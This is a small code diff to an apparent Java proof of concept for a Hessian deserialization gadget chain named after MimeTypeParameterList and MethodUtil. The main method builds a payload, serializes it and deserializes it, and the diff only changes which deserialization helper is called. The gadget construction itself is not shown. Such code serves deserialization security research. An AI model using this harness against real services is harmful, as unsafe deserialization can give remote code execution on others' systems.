@@ -13,7 +13,7 @@ public class MimeTypeParameterList_MethodUtil {
     public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, IOException, ClassNotFoundException {
         Object payload = getPayload();
         byte[] bytes = HessianTools.hessian2ToStringSer(payload);
-        HessianTools.hessian2Deser(bytes);
+        HessianTools.hessianDeser(bytes, "2");
     }
 
 
